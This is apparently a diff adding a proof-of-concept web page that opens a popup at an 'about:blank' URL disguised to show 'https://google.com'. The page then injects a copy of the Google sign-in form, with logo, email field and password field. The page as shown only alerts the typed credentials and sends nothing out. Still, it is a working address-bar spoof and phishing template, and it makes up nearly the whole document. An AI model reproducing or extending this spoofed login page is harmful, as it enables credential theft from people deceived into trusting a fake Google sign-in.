@@ -1,0 +1,49 @@
+<center><br><br><br><br>
+<button style="font-size:100px;" onclick="x();">Click me</button>
+
+<script>
+var j='';
+function x(){
+  j = window.open(`about:blank?.|.https://google.com`,`j`)
+
+  setTimeout(() => {
+    j.document.body.innerHTML = `
+      <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Roboto, Arial, sans-serif;background:#f0f0f0;margin:0;">
+        
+        <!-- Google Logo -->
+        <div style="margin-bottom:30px;text-align:center;">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
+               alt="Google Logo" style="width:150px;height:auto;">
+        </div>
+        
+        <!-- Login Card -->
+        <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 1px 6px rgba(0,0,0,0.2);width:360px;text-align:center;">
+          <h2 style="margin-bottom:25px;font-weight:400;font-size:24px;color:#202124;">Sign in</h2>
+          <p style="margin:0 0 25px 0;font-size:16px;color:#5f6368;">Use your Google Account</p>
+          
+          <input id="user" type="text" placeholder="Email or phone"
+            style="width:100%;padding:12px;margin-bottom:20px;font-size:16px;border:1px solid #dadce0;border-radius:4px;">
+          
+          <input id="pass" type="password" placeholder="Enter your password"
+            style="width:100%;padding:12px;margin-bottom:25px;font-size:16px;border:1px solid #dadce0;border-radius:4px;">
+          
+          <button onclick="alert('Email: '+document.getElementById('user').value+'\\nPassword: '+document.getElementById('pass').value)" 
+            style="width:100%;padding:12px;font-size:16px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;">
+            Next
+          </button>
+          
+          <div style="margin-top:25px;text-align:left;font-size:14px;">
+            <a href="#" style="color:#1a73e8;text-decoration:none;">Forgot email?</a>
+          </div>
+        </div>
+        
+        <!-- Footer -->
+        <div style="margin-top:20px;font-size:14px;color:#5f6368;">
+          <p>Not your computer? Use Guest mode to sign in privately. <a href="#" style="color:#1a73e8;text-decoration:none;">Learn more</a></p>
+          <p>Don’t have an account? <a href="#" style="color:#1a73e8;text-decoration:none;">Create account</a></p>
+        </div>
+      </div>
+    `;
+  }, 250);
+}
+</script>
